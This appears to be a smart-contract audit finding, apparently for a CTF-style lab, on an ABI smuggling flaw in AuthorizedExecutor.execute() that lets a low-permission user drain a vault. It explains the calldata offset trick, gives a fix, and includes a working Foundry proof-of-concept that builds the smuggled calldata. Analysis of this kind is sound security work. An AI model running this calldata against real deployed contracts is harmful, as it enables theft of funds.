# [CRITICAL] ABI Smuggling — Authorization Bypass via Calldata Offset Manipulation

## Summary
The `execute()` function in `AuthorizedExecutor` reads the function selector from a hardcoded calldata position (byte 100) using inline assembly, but forwards the Solidity-decoded `actionData` parameter to `functionCall()`. Since ABI encoding of `bytes` uses a caller-controlled offset pointer, an attacker can craft calldata where the permission check reads an authorized selector (e.g., `withdraw`) while the actual call executes a different function (e.g., `sweepFunds`), draining the entire vault.

## Severity
- **Impact:** Critical — Complete loss of all vault funds (1,000,000 DVT)
- **Likelihood:** High — Any user with ANY permission can exploit this; no special conditions required
- **Difficulty:** Low — Single transaction, no flash loan, no MEV, no timing constraints; just crafted calldata
- **Overall:** Critical

## Prerequisites
- Attacker must have at least one valid permission (any selector, for the vault target)
- Vault must hold tokens
- No other prerequisites — works in a single transaction at any time

## Affected Code
- **File:** `AuthorizedExecutor.sol`
- **Lines:** L46-L61
- **Function:** `execute()`

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // Read the 4-bytes selector at the beginning of `actionData`
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
        selector := calldataload(calldataOffset)  // ← reads from HARDCODED position
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {  // ← checks WRONG selector
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);  // ← executes REAL actionData from ABI decoder
}
```

## Root Cause
The ABI encoding of `execute(address, bytes calldata)` includes:
- Byte 4-35: `target` address (static, word 1)
- Byte 36-67: **offset pointer** to `actionData` (dynamic type, word 2)
- The offset pointer tells Solidity's decoder where to find the length + data of `actionData`

Standard encoding uses offset `0x40` (64), placing the data at byte 68 (length) and byte 100 (content). The code hardcodes `calldataOffset = 4 + 32 * 3 = 100`, which only works for offset `0x40`.

**The offset pointer is attacker-controlled.** By setting it to `0x80` (128) instead of `0x40`, the attacker shifts where Solidity reads `actionData` to byte 132 (length) and byte 164 (content), while the assembly still reads byte 100. The attacker places an authorized selector at byte 100 (decoy) and the real malicious payload at byte 164.

## Attack Scenario
1. Player has permission for `withdraw` selector (`0xd9caed12`) on the vault
2. Player crafts raw calldata for `execute()` with:
   - `target` = vault address
   - Offset pointer = `0x80` (instead of standard `0x40`)
   - Byte 100: `0xd9caed12` (withdraw selector — decoy for permission check)
   - Byte 132: length of real actionData
   - Byte 164: `0x85fb709d` + sweepFunds parameters (recovery address, DVT token)
3. Permission check reads byte 100 → `0xd9caed12` → player is authorized → **passes**
4. `_beforeFunctionCall` checks target == vault → **passes**
5. `functionCall(actionData)` follows offset `0x80` → executes `sweepFunds(recovery, DVT)` → **drains entire vault**

Knob combination: TAG-009 (offset) + TAG-010 (decoy) + TAG-011 (permission) + TAG-014 (impact)

## Impact
- **100% of vault funds stolen** — all 1,000,000 DVT transferred to attacker-controlled address
- Any user with ANY permission can drain the vault, not just the `sweepFunds`-authorized deployer
- Single transaction, irreversible

## Recommendation
Replace the inline assembly calldata read with Solidity's native parameter access:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // Extract selector from the Solidity-decoded actionData parameter
    bytes4 selector = bytes4(actionData[:4]);

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);
}
```

This ensures the permission check always reads the selector from the same data that `functionCall` executes, eliminating any divergence regardless of ABI encoding.

## Proof of Concept Suggestion

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    // Build the smuggled calldata manually
    //
    // Layout:
    // [0x00] 1cff79cd                         — execute() selector
    // [0x04] vault address (padded to 32)      — target parameter
    // [0x24] 0x80                              — offset to actionData (manipulated!)
    // [0x44] 0x00...00                         — padding (bytes 68-99)
    // [0x64] d9caed12 00...00                  — DECOY: withdraw selector at byte 100
    // [0x84] 0x44                              — length of real actionData (68 bytes)
    // [0xa4] 85fb709d                          — sweepFunds selector
    //        recovery address (padded)          — sweepFunds param: receiver
    //        token address (padded)             — sweepFunds param: token

    bytes memory sweepCalldata = abi.encodeCall(
        SelfAuthorizedVault.sweepFunds, (recovery, IERC20(address(token)))
    );

    bytes memory smuggledCalldata = abi.encodePacked(
        // execute() selector
        bytes4(0x1cff79cd),
        // target = vault (word 1)
        uint256(uint160(address(vault))),
        // offset to actionData = 0x80 (word 2) — skip past decoy
        uint256(0x80),
        // padding (word 3, bytes 68-99)
        uint256(0),
        // DECOY at byte 100: withdraw selector (passes permission check)
        bytes32(bytes4(0xd9caed12)),
        // length of real actionData (word at byte 132)
        uint256(sweepCalldata.length),
        // real actionData starting at byte 164: sweepFunds calldata
        sweepCalldata
    );

    (bool success, ) = address(vault).call(smuggledCalldata);
    require(success, "Smuggled call failed");
}
```

## References
- Tags: TAG-001, TAG-002, TAG-003, TAG-007, TAG-008, TAG-009, TAG-010, TAG-011, TAG-014
- Flow diagram: `.audit/diagrams/flows/execute-smuggled.md`
- Breaks invariants #1, #2, #5, #10 from `goals.md`
- Related: [SWC-127](https://swcregistry.io/docs/SWC-127) — Arbitrary Jump with Function Type Variable
- Related pattern: ABI encoding manipulation in Solidity — non-standard but valid calldata encoding
